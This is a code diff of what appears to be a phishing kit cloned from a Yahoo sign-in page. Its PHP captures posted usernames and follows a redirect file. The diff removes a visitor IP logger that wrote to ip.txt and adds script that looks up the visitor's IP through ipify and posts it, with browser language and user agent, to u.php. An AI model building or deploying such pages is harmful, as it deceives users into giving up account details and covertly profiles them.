@@ -1,23 +1,4 @@
 <?php
-function get_IP_address()
-{
-  if (!empty($_SERVER['HTTP_CLIENT_IP']))
-  {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-  {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  }
-else
-  {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  }
-  return $ipaddress;
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
-?>
-<?php
 $u = $_POST['username'];
 $f = fopen('redir.txt','r');
 $r = fread($f,filesize("redir.txt"));
@@ -508,6 +489,28 @@ root.isIOSDevice = false;
             }
         }(this));
     </script>
-    
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
+</script>    
 
 <!-- fe05.member.sg3.yahoo.com - Tue Mar 23 2021 07:29:28 GMT+0000 (Coordinated Universal Time) - (0ms) --><script src="./Yahoo_files/client.php"></script><div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="./Yahoo_files/r-csc.html" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div></body></html>
